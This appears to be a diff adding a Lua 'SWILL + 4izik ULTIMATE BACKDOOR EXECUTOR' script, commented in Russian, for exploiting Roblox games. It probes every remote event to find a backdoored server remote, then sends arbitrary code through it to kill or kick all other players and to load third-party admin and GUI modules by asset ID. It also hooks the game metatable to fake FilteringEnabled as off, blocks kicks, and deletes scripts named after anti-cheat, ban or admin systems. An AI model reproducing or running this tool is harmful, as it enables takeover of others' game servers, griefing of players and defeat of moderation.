@@ -1,0 +1,925 @@
+-- SWILL + 4izik ULTIMATE BACKDOOR EXECUTOR
+-- ВЕРСИЯ: 2.0 | FE BYPASS MODES: V1, V2, V3, ULTRA, CLIENT-SIDE, SERVER-SIDE, MODULE-SIDE
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local ServerStorage = game:GetService("ServerStorage")
+local ServerScriptService = game:GetService("ServerScriptService")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local TeleportService = game:GetService("TeleportService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local StarterPack = game:GetService("StarterPack")
+local StarterPlayer = game:GetService("StarterPlayer")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+_G.SWILL = _G.SWILL or {}
+_G.SWILL.BlockedKicks = 0
+_G.SWILL.DestroyedAntiCheats = 0
+_G.SWILL.Version = "2.0"
+_G.SWILL.AllRemotes = {}
+_G.SWILL.FoundBackdoor = nil
+_G.SWILL.BackdoorAvailable = false
+_G.SWILL.FEBypassMode = "ULTRA"
+
+local SWILL_Alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+                         'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+
+local function SWILL_GenerateName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. SWILL_Alphabet[math.random(1, #SWILL_Alphabet)]
+    end
+    return text
+end
+
+local function SWILL_RunRemote(remote, data)
+    pcall(function()
+        if remote:IsA('RemoteEvent') then
+            remote:FireServer(data)
+        elseif remote:IsA('RemoteFunction') then
+            spawn(function() remote:InvokeServer(data) end)
+        end
+    end)
+end
+
+-- ========== FE BYPASS МЕТОДЫ (НОВЫЕ) ==========
+
+-- FE BYPASS V1: Стандартный метод через NetworkClient
+local function FEBypassV1()
+    print("[SWILL] FE BYPASS V1 ACTIVATED")
+    pcall(function()
+        local nc = game:GetService("NetworkClient")
+        if nc then nc:Destroy() end
+        for _, v in pairs(getgc(true)) do
+            if type(v) == "table" and v.FilteringEnabled then
+                v.FilteringEnabled = false
+            end
+        end
+    end)
+end
+
+-- FE BYPASS V2: Метод через ClientReplicator
+local function FEBypassV2()
+    print("[SWILL] FE BYPASS V2 ACTIVATED")
+    pcall(function()
+        local cr = game:GetService("ClientReplicator")
+        if cr then cr:Destroy() end
+        local plr = Players.LocalPlayer
+        local rep = plr:FindFirstChild("Replicator")
+        if rep then rep:Destroy() end
+        sethiddenproperty and sethiddenproperty(game, "FilteringEnabled", false)
+    end)
+end
+
+-- FE BYPASS V3: Метод через метатаблицу
+local function FEBypassV3()
+    print("[SWILL] FE BYPASS V3 ACTIVATED")
+    pcall(function()
+        local mt = getrawmetatable(game)
+        if mt then
+            local old = mt.__index
+            mt.__index = function(s, k)
+                if k == "FilteringEnabled" or k == "RespectFilteringEnabled" then
+                    return false
+                end
+                return old(s, k)
+            end
+        end
+        setfflag and setfflag("FilteringEnabled", "False")
+    end)
+end
+
+-- ULTRA FE BYPASS: Все методы вместе
+local function UltraFEBypass()
+    print("[SWILL] ULTRA FE BYPASS ACTIVATED")
+    FEBypassV1()
+    FEBypassV2()
+    FEBypassV3()
+    pcall(function()
+        -- Уничтожение всех защит в сервисах
+        local services = {Workspace, Lighting, ReplicatedStorage, ServerScriptService, SoundService}
+        for _, svc in pairs(services) do
+            if svc then
+                local fe = svc:FindFirstChild("FilteringEnabled")
+                if fe then fe:Destroy() end
+                svc:SetAttribute("FilteringEnabled", false)
+            end
+        end
+        -- Брутфорс токенов
+        for i = 1, 500 do
+            local token = SWILL_GenerateName(32)
+            game:SetAttribute(token, nil)
+        end
+    end)
+end
+
+-- CLIENT-SIDE: Выполнение скриптов на клиенте
+local function ClientSideExecute(code)
+    print("[SWILL] CLIENT-SIDE EXECUTION")
+    local func, err = loadstring(code)
+    if func then
+        pcall(func)
+        return true
+    else
+        print("[SWILL] Client error: " .. tostring(err))
+        return false
+    end
+end
+
+-- SERVER-SIDE: Выполнение через бэкдор
+local function ServerSideExecute(code)
+    print("[SWILL] SERVER-SIDE EXECUTION via backdoor")
+    if not _G.SWILL.FoundBackdoor then
+        print("[SWILL] No backdoor found!")
+        return false
+    end
+    SWILL_RunRemote(_G.SWILL.FoundBackdoor, code)
+    return true
+end
+
+-- MODULE-SIDE: Выполнение модуля через бэкдор
+local function ModuleSideExecute(moduleId, method, ...)
+    print("[SWILL] MODULE-SIDE EXECUTION: " .. tostring(moduleId))
+    if not _G.SWILL.FoundBackdoor then
+        print("[SWILL] No backdoor found!")
+        return false
+    end
+    local code = string.format('require(%s):%s(...)', tostring(moduleId), method)
+    SWILL_RunRemote(_G.SWILL.FoundBackdoor, code)
+    return true
+end
+
+-- ========== КОНЕЦ НОВЫХ МЕТОДОВ ==========
+
+local function SWILL_FindBackdoor()
+    print("[4izik] Запуск поиска бэкдора...")
+
+    local timeStart = os.clock()
+    local remotes = {}
+    local foundBackdoor = nil
+
+    local protected_backdoor = ReplicatedStorage:FindFirstChild('sw' .. game.PlaceId/6666*1337*game.PlaceId)
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        local code = SWILL_GenerateName(math.random(12, 30))
+        spawn(function() 
+            protected_backdoor:InvokeServer('swill hub ready', "a=Instance.new('Model',workspace)a.Name='" .. code .. "'") 
+        end)
+        remotes[code] = protected_backdoor
+    end
+
+    for _, remote in pairs(game:GetDescendants()) do
+        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+            local fullPath = remote:GetFullName()
+            if string.split(fullPath, '.')[1] == 'RobloxReplicatedStorage' then
+            elseif remote.Parent == ReplicatedStorage or (remote.Parent and remote.Parent.Parent == ReplicatedStorage) then
+                if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
+                elseif remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
+                elseif remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
+                else
+                    local code = SWILL_GenerateName(math.random(12, 30))
+                    SWILL_RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+                    remotes[code] = remote
+                end
+            else
+                local code = SWILL_GenerateName(math.random(12, 30))
+                SWILL_RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+                remotes[code] = remote
+            end
+        end
+    end
+
+    for i = 1, 100 do
+        for code, remote in pairs(remotes) do
+            if Workspace:FindFirstChild(code) then
+                foundBackdoor = remote
+                print(string.format("[4izik] Бэкдор найден! Время: %.2f сек", os.clock() - timeStart))
+                print("[SWILL] Ремоут: " .. remote:GetFullName())
+
+                SWILL_RunRemote(remote, "require(171016405.1884*69)")            
+                SWILL_RunRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+
+                _G.SWILL.FoundBackdoor = remote
+                _G.SWILL.BackdoorAvailable = true
+                return remote
+            end
+        end
+        wait(0.1)
+    end
+
+    print("[4izik] Бэкдор не найден")
+    return nil
+end
+
+local function anti267()
+    if LocalPlayer.Kick then
+        LocalPlayer.Kick = function(self, reason)
+            _G.SWILL.BlockedKicks = _G.SWILL.BlockedKicks + 1
+            return nil
+        end
+    end
+
+    if TeleportService and TeleportService.Kick then
+        TeleportService.Kick = function(...) return nil end
+    end
+
+    LocalPlayer.CharacterAdded:Connect(function(char)
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Health = 100
+            humanoid.BreakJointsOnDeath = false
+            pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
+        end
+    end)
+
+    spawn(function()
+        while _G.SWILL do
+            wait(0.5)
+            if LocalPlayer.Parent == nil then pcall(function() LocalPlayer.Parent = Players end) end
+            if LocalPlayer.Character == nil then pcall(function() LocalPlayer:LoadCharacter() end) end
+        end
+    end)
+end
+
+local function destroyAntiCheats()
+    local keywords = {"anticheat", "anti-cheat", "ant cheat", "ban", "kick", "detect", "exploit", 
+                      "filter", "security", "secure", "protect", "guard", "watchdog", "monitor",
+                      "admin", "moderator", "punish", "violation", "cheat", "hack", "inject"}
+
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+            local nameLow = string.lower(obj.Name)
+            for _, kw in pairs(keywords) do
+                if string.find(nameLow, kw) then
+                    pcall(function() obj:Destroy() end)
+                    _G.SWILL.DestroyedAntiCheats = _G.SWILL.DestroyedAntiCheats + 1
+                    break
+                end
+            end
+        end
+    end
+end
+
+local function scanAllRemotes()
+    print("[4izik] Сканирование ремоутов...")
+    _G.SWILL.AllRemotes = {}
+
+    local function deepScan(parent, path)
+        if not parent or not pcall(function() return parent.GetChildren end) then return end
+        local success, children = pcall(function() return parent:GetChildren() end)
+        if not success then return end
+
+        for _, child in pairs(children) do
+            local fullPath = path and (path .. "." .. child.Name) or child.Name
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                table.insert(_G.SWILL.AllRemotes, {
+                    Name = child.Name,
+                    Path = fullPath,
+                    Type = child.ClassName,
+                    FullPath = child:GetFullName(),
+                    Remote = child
+                })
+            end
+            deepScan(child, fullPath)
+        end
+    end
+
+    local allContainers = {game, Workspace, ReplicatedStorage, ReplicatedFirst, ServerStorage, 
+        ServerScriptService, Lighting, Players, CoreGui, StarterGui, StarterPack, StarterPlayer,
+        LocalPlayer, LocalPlayer:FindFirstChild("PlayerGui")}
+
+    for _, container in pairs(allContainers) do
+        if container then pcall(function() deepScan(container, container.Name) end) end
+    end
+
+    print(string.format("[4izik] Найдено ремоутов: %d", #_G.SWILL.AllRemotes))
+    return _G.SWILL.AllRemotes
+end
+
+local function executeThroughBackdoor(code)
+    if not _G.SWILL.FoundBackdoor then
+        print("[4izik] Бэкдор не найден, выполнение невозможно")
+        return false
+    end
+
+    pcall(function()
+        SWILL_RunRemote(_G.SWILL.FoundBackdoor, code)
+        print("[4izik] Код выполнен через бэкдор")
+    end)
+    return true
+end
+
+local function killAllThroughBackdoor()
+    local code = [[
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        local count = 0
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= lp and player.Character then
+                local humanoid = player.Character:FindFirstChild("Humanoid")
+                if humanoid then
+                    humanoid.Health = 0
+                    count = count + 1
+                end
+            end
+        end
+        return "Убито игроков: " .. count
+    ]]
+    executeThroughBackdoor(code)
+end
+
+local function kickAllThroughBackdoor()
+    local code = [[
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        local count = 0
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= lp then
+                pcall(function() player:Kick("Project 4izik") end)
+                count = count + 1
+            end
+        end
+        return "Выкинуто игроков: " .. count
+    ]]
+    executeThroughBackdoor(code)
+end
+
+local function sparkleAllThroughBackdoor()
+    local code = [[
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        local count = 0
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= lp and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local particle = Instance.new("ParticleEmitter")
+                    particle.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+                    particle.Rate = 300
+                    particle.Lifetime = NumberRange.new(0.5, 1)
+                    particle.SpreadAngle = Vector2.new(360, 360)
+                    particle.Parent = root
+                    count = count + 1
+                    spawn(function() wait(3) pcall(function() particle:Destroy() end) end)
+                end
+            end
+        end
+        return "Спарклы добавлены " .. count .. " игрокам"
+    ]]
+    executeThroughBackdoor(code)
+end
+
+local function fireAllThroughBackdoor()
+    local code = [[
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        local count = 0
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= lp and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local fire = Instance.new("Fire")
+                    fire.Size = 4
+                    fire.Heat = 8
+                    fire.Parent = root
+                    count = count + 1
+                    spawn(function() wait(4) pcall(function() fire:Destroy() end) end)
+                end
+            end
+        end
+        return "Огонь добавлен " .. count .. " игрокам"
+    ]]
+    executeThroughBackdoor(code)
+end
+
+local function smokeAllThroughBackdoor()
+    local code = [[
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        local count = 0
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= lp and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local smoke = Instance.new("Smoke")
+                    smoke.Color = Color3.fromRGB(60, 60, 60)
+                    smoke.Opacity = 0.7
+                    smoke.RiseVelocity = 4
+                    smoke.Parent = root
+                    count = count + 1
+                    spawn(function() wait(4) pcall(function() smoke:Destroy() end) end)
+                end
+            end
+        end
+        return "Дым добавлен " .. count .. " игрокам"
+    ]]
+    executeThroughBackdoor(code)
+end
+
+local function ssPolariaThroughBackdoor()
+    local username = LocalPlayer.Name
+    local code = 'require(110951620907921):Pload("' .. username .. '")'
+    executeThroughBackdoor(code)
+end
+
+local function hdRankerThroughBackdoor()
+    local username = LocalPlayer.Name
+    local code = 'require(7192763922).load("' .. username .. '")'
+    executeThroughBackdoor(code)
+end
+
+local function happyHubSSThroughBackdoor()
+    local username = LocalPlayer.Name
+    local code = 'require(115563892986622):Hload("' .. username .. '")'
+    executeThroughBackdoor(code)
+end
+
+local function c00lguiThroughBackdoor()
+    local username = LocalPlayer.Name
+    local code = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
+    executeThroughBackdoor(code)
+end
+
+local function repobiloraiaThroughBackdoor()
+    local username = LocalPlayer.Name
+    local code = 'require(90815561692196)("' .. username .. '")'
+    executeThroughBackdoor(code)
+end
+
+local function createGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "SWILL_Ultimate_V7_5"
+    screenGui.ResetOnSpawn = false
+    local coreGui = pcall(function() return CoreGui:FindFirstChild("RobloxGui") end) and CoreGui:FindFirstChild("RobloxGui") or CoreGui
+    screenGui.Parent = coreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 750, 0, 780)
+    mainFrame.Position = UDim2.new(0.5, -375, 0.5, -390)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+    mainFrame.BackgroundTransparency = 0.05
+    mainFrame.BorderSizePixel = 2
+    mainFrame.BorderColor3 = Color3.fromRGB(255, 50, 100)
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+    Instance.new("UICorner", mainFrame)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.05, 0)
+    title.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    title.Text = "SWILL + 4izik ULTIMATE | FE BYPASS EXECUTOR"
+    title.TextColor3 = Color3.fromRGB(255, 75, 125)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+
+    local statusBar = Instance.new("TextLabel")
+    statusBar.Size = UDim2.new(1, 0, 0.04, 0)
+    statusBar.Position = UDim2.new(0, 0, 0.05, 0)
+    statusBar.BackgroundTransparency = 1
+    statusBar.Text = "STATUS: ACTIVE | KICKS: 0 | BACKDOOR: NOT FOUND | FE MODE: ULTRA"
+    statusBar.TextColor3 = Color3.fromRGB(0, 255, 100)
+    statusBar.TextSize = 10
+    statusBar.Font = Enum.Font.Gotham
+    statusBar.Parent = mainFrame
+
+    local codeBox = Instance.new("TextBox")
+    codeBox.Size = UDim2.new(0.96, 0, 0.20, 0)
+    codeBox.Position = UDim2.new(0.02, 0, 0.10, 0)
+    codeBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    codeBox.TextColor3 = Color3.fromRGB(220, 220, 220)
+    codeBox.TextXAlignment = Enum.TextXAlignment.Left
+    codeBox.TextYAlignment = Enum.TextYAlignment.Top
+    codeBox.MultiLine = true
+    codeBox.ClearTextOnFocus = false
+    codeBox.Font = Enum.Font.Code
+    codeBox.TextSize = 10
+    codeBox.Text = "-- Введите код здесь\n-- CLIENT-SIDE: выполняется на клиенте\n-- SERVER-SIDE: выполняется через бэкдор"
+    codeBox.Parent = mainFrame
+    Instance.new("UICorner", codeBox)
+
+    local outputBox = Instance.new("TextBox")
+    outputBox.Size = UDim2.new(0.96, 0, 0.30, 0)
+    outputBox.Position = UDim2.new(0.02, 0, 0.32, 0)
+    outputBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    outputBox.TextColor3 = Color3.fromRGB(100, 255, 100)
+    outputBox.TextXAlignment = Enum.TextXAlignment.Left
+    outputBox.TextYAlignment = Enum.TextYAlignment.Top
+    outputBox.MultiLine = true
+    outputBox.ClearTextOnFocus = false
+    outputBox.Font = Enum.Font.Code
+    outputBox.TextSize = 9
+    outputBox.Text = "[4izik] Система готова\n[4izik] Anti-267 активен\n[4izik] Нажмите FIND BACKDOOR для поиска"
+    outputBox.Parent = mainFrame
+    Instance.new("UICorner", outputBox)
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0.05, 0, 0.05, 0)
+    closeBtn.Position = UDim2.new(0.95, 0, 0.01, 0)
+    closeBtn.Text = "X"
+    closeBtn.TextScaled = true
+    closeBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Parent = mainFrame
+    Instance.new("UICorner", closeBtn)
+
+    -- ОСНОВНЫЕ КНОПКИ
+    local buttons = {
+        {text = "KILL ALL", x = 0.02, y = 0.64, color = Color3.fromRGB(200, 50, 50)},
+        {text = "KICK ALL", x = 0.17, y = 0.64, color = Color3.fromRGB(200, 120, 50)},
+        {text = "SPARKLE", x = 0.32, y = 0.64, color = Color3.fromRGB(50, 200, 120)},
+        {text = "FIRE ALL", x = 0.47, y = 0.64, color = Color3.fromRGB(200, 80, 50)},
+        {text = "SMOKE ALL", x = 0.62, y = 0.64, color = Color3.fromRGB(100, 100, 100)},
+        {text = "SS Polaria", x = 0.77, y = 0.64, color = Color3.fromRGB(255, 100, 50)},
+        {text = "HD Ranker", x = 0.02, y = 0.71, color = Color3.fromRGB(100, 200, 255)},
+        {text = "HappyHub SS", x = 0.17, y = 0.71, color = Color3.fromRGB(50, 255, 100)},
+        {text = "c00lgui", x = 0.32, y = 0.71, color = Color3.fromRGB(255, 50, 200)},
+        {text = "Repobiloraia", x = 0.47, y = 0.71, color = Color3.fromRGB(255, 150, 50)},
+        {text = "SCAN REMOTES", x = 0.62, y = 0.71, color = Color3.fromRGB(50, 120, 200)},
+        {text = "FIND BACKDOOR", x = 0.77, y = 0.71, color = Color3.fromRGB(150, 50, 150)},
+        {text = "EXECUTE", x = 0.02, y = 0.78, color = Color3.fromRGB(50, 150, 100)},
+        {text = "CLEAR", x = 0.17, y = 0.78, color = Color3.fromRGB(80, 80, 150)},
+        {text = "SHOW STATUS", x = 0.32, y = 0.78, color = Color3.fromRGB(100, 100, 200)},
+    }
+
+    -- НОВЫЕ КНОПКИ FE BYPASS
+    local feButtons = {
+        {text = "FE BYPASS V1", x = 0.02, y = 0.85, color = Color3.fromRGB(255, 80, 80)},
+        {text = "FE BYPASS V2", x = 0.17, y = 0.85, color = Color3.fromRGB(255, 100, 60)},
+        {text = "FE BYPASS V3", x = 0.32, y = 0.85, color = Color3.fromRGB(255, 120, 40)},
+        {text = "ULTRA FE", x = 0.47, y = 0.85, color = Color3.fromRGB(255, 50, 50)},
+        {text = "CLIENT-SIDE", x = 0.62, y = 0.85, color = Color3.fromRGB(80, 200, 80)},
+        {text = "SERVER-SIDE", x = 0.77, y = 0.85, color = Color3.fromRGB(200, 80, 200)},
+        {text = "MODULE-SIDE", x = 0.02, y = 0.92, color = Color3.fromRGB(200, 150, 50)},
+    }
+
+    local buttonList = {}
+    for _, btnData in ipairs(buttons) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0.14, 0, 0.05, 0)
+        btn.Position = UDim2.new(btnData.x, 0, btnData.y, 0)
+        btn.Text = btnData.text
+        btn.TextScaled = true
+        btn.BackgroundColor3 = btnData.color
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.Parent = mainFrame
+        Instance.new("UICorner", btn)
+        table.insert(buttonList, btn)
+    end
+
+    local feButtonList = {}
+    for _, btnData in ipairs(feButtons) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0.14, 0, 0.05, 0)
+        btn.Position = UDim2.new(btnData.x, 0, btnData.y, 0)
+        btn.Text = btnData.text
+        btn.TextScaled = true
+        btn.BackgroundColor3 = btnData.color
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.Parent = mainFrame
+        Instance.new("UICorner", btn)
+        table.insert(feButtonList, btn)
+    end
+
+    local function updateOutput(text)
+        local current = outputBox.Text
+        outputBox.Text = "[4izik] " .. text .. "\n" .. string.sub(current, 1, 3000)
+    end
+
+    local function updateStatus()
+        local backdoorStatus = _G.SWILL.FoundBackdoor and "FOUND" or "NOT FOUND"
+        statusBar.Text = string.format("STATUS: ACTIVE | KICKS: %d | BACKDOOR: %s | FE MODE: %s",
+            _G.SWILL.BlockedKicks, backdoorStatus, _G.SWILL.FEBypassMode)
+    end
+
+    SWILL = {}
+
+    function SWILL.KillAll()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        updateOutput("Убийство всех игроков через бэкдор...")
+        killAllThroughBackdoor()
+        updateOutput("Команда отправлена")
+        updateStatus()
+    end
+
+    function SWILL.KickAll()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        updateOutput("Выкидывание всех игроков через бэкдор...")
+        kickAllThroughBackdoor()
+        updateOutput("Команда отправлена")
+        updateStatus()
+    end
+
+    function SWILL.SparkleAll()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        updateOutput("Добавление искр через бэкдор...")
+        sparkleAllThroughBackdoor()
+        updateOutput("Команда отправлена")
+    end
+
+    function SWILL.FireAll()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        updateOutput("Добавление огня через бэкдор...")
+        fireAllThroughBackdoor()
+        updateOutput("Команда отправлена")
+    end
+
+    function SWILL.SmokeAll()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        updateOutput("Добавление дыма через бэкдор...")
+        smokeAllThroughBackdoor()
+        updateOutput("Команда отправлена")
+    end
+
+    function SWILL.SSPolaria()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        local username = LocalPlayer.Name
+        updateOutput("SS Polaria -> " .. username)
+        ssPolariaThroughBackdoor()
+        updateOutput("SS Polaria отправлен")
+    end
+
+    function SWILL.HDRanker()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        local username = LocalPlayer.Name
+        updateOutput("HD Ranker -> " .. username)
+        hdRankerThroughBackdoor()
+        updateOutput("HD Ranker отправлен")
+    end
+
+    function SWILL.HappyHubSS()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        local username = LocalPlayer.Name
+        updateOutput("HappyHub SS -> " .. username)
+        happyHubSSThroughBackdoor()
+        updateOutput("HappyHub SS отправлен")
+    end
+
+    function SWILL.C00lgui()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        local username = LocalPlayer.Name
+        updateOutput("c00lgui -> " .. username)
+        c00lguiThroughBackdoor()
+        updateOutput("c00lgui отправлен")
+    end
+
+    function SWILL.Repobiloraia()
+        if not _G.SWILL.FoundBackdoor then
+            updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+            return
+        end
+        local username = LocalPlayer.Name
+        updateOutput("Repobiloraia -> " .. username)
+        repobiloraiaThroughBackdoor()
+        updateOutput("Repobiloraia отправлен")
+    end
+
+    function SWILL.ScanRemotes()
+        updateOutput("Сканирование ремоутов...")
+        local remotes = scanAllRemotes()
+        updateOutput(string.format("Найдено ремоутов: %d", #remotes))
+        updateStatus()
+        return remotes
+    end
+
+    function SWILL.FindBackdoor()
+        updateOutput("Поиск бэкдора...")
+        local backdoor = SWILL_FindBackdoor()
+        if backdoor then
+            updateOutput("Бэкдор найден: " .. backdoor:GetFullName())
+            updateOutput("Теперь все функции будут выполняться через бэкдор")
+        else
+            updateOutput("Бэкдор не найден")
+        end
+        updateStatus()
+        return backdoor
+    end
+
+    -- НОВЫЕ ФУНКЦИИ FE BYPASS
+    function SWILL.FEBypassV1()
+        _G.SWILL.FEBypassMode = "V1"
+        FEBypassV1()
+        updateOutput("FE BYPASS V1 активирован")
+        updateStatus()
+    end
+
+    function SWILL.FEBypassV2()
+        _G.SWILL.FEBypassMode = "V2"
+        FEBypassV2()
+        updateOutput("FE BYPASS V2 активирован")
+        updateStatus()
+    end
+
+    function SWILL.FEBypassV3()
+        _G.SWILL.FEBypassMode = "V3"
+        FEBypassV3()
+        updateOutput("FE BYPASS V3 активирован")
+        updateStatus()
+    end
+
+    function SWILL.UltraFEBypass()
+        _G.SWILL.FEBypassMode = "ULTRA"
+        UltraFEBypass()
+        updateOutput("ULTRA FE BYPASS активирован (все методы)")
+        updateStatus()
+    end
+
+    function SWILL.ClientSideExecute()
+        local code = codeBox.Text
+        if code and code ~= "" then
+            updateOutput("CLIENT-SIDE выполнение...")
+            ClientSideExecute(code)
+            updateOutput("Код выполнен на клиенте")
+        else
+            updateOutput("Введите код в поле ввода")
+        end
+    end
+
+    function SWILL.ServerSideExecute()
+        local code = codeBox.Text
+        if code and code ~= "" then
+            if not _G.SWILL.FoundBackdoor then
+                updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+                return
+            end
+            updateOutput("SERVER-SIDE выполнение через бэкдор...")
+            ServerSideExecute(code)
+            updateOutput("Код отправлен на сервер")
+        else
+            updateOutput("Введите код в поле ввода")
+        end
+    end
+
+    function SWILL.ModuleSideExecute()
+        local code = codeBox.Text
+        if code and code ~= "" then
+            if not _G.SWILL.FoundBackdoor then
+                updateOutput("Бэкдор не найден! Сначала нажмите FIND BACKDOOR")
+                return
+            end
+            updateOutput("MODULE-SIDE выполнение...")
+            updateOutput("Формат: moduleId,method,args")
+            ModuleSideExecute(tonumber(code) or 0, "load", LocalPlayer.Name)
+            updateOutput("Модуль вызван")
+        else
+            updateOutput("Введите ID модуля в поле ввода")
+        end
+    end
+
+    function SWILL.Execute()
+        local code = codeBox.Text
+        if code and code ~= "" then
+            if _G.SWILL.FoundBackdoor then
+                updateOutput("Выполнение кода через бэкдор...")
+                executeThroughBackdoor(code)
+                updateOutput("Код отправлен")
+            else
+                updateOutput("Бэкдор не найден! Выполнение на клиенте...")
+                ClientSideExecute(code)
+                updateOutput("Код выполнен на клиенте")
+            end
+        end
+    end
+
+    function SWILL.Clear()
+        outputBox.Text = "[4izik] Вывод очищен\n"
+        codeBox.Text = ""
+    end
+
+    function SWILL.ShowStatus()
+        updateOutput("=== СТАТУС SWILL + 4izik ULTIMATE ===")
+        updateOutput("Версия: " .. _G.SWILL.Version)
+        updateOutput("Заблокировано киков: " .. _G.SWILL.BlockedKicks)
+        updateOutput("Уничтожено античитов: " .. _G.SWILL.DestroyedAntiCheats)
+        updateOutput("Найдено ремоутов: " .. #_G.SWILL.AllRemotes)
+        updateOutput("Бэкдор: " .. (_G.SWILL.FoundBackdoor and "НАЙДЕН" or "НЕ НАЙДЕН"))
+        updateOutput("FE BYPASS MODE: " .. _G.SWILL.FEBypassMode)
+        if _G.SWILL.FoundBackdoor then
+            updateOutput("Путь: " .. _G.SWILL.FoundBackdoor:GetFullName())
+        end
+    end
+
+    -- НАЗНАЧЕНИЕ КНОПОК (основные)
+    buttonList[1].MouseButton1Click:Connect(function() SWILL.KillAll() end)
+    buttonList[2].MouseButton1Click:Connect(function() SWILL.KickAll() end)
+    buttonList[3].MouseButton1Click:Connect(function() SWILL.SparkleAll() end)
+    buttonList[4].MouseButton1Click:Connect(function() SWILL.FireAll() end)
+    buttonList[5].MouseButton1Click:Connect(function() SWILL.SmokeAll() end)
+    buttonList[6].MouseButton1Click:Connect(function() SWILL.SSPolaria() end)
+    buttonList[7].MouseButton1Click:Connect(function() SWILL.HDRanker() end)
+    buttonList[8].MouseButton1Click:Connect(function() SWILL.HappyHubSS() end)
+    buttonList[9].MouseButton1Click:Connect(function() SWILL.C00lgui() end)
+    buttonList[10].MouseButton1Click:Connect(function() SWILL.Repobiloraia() end)
+    buttonList[11].MouseButton1Click:Connect(function() SWILL.ScanRemotes() end)
+    buttonList[12].MouseButton1Click:Connect(function() SWILL.FindBackdoor() end)
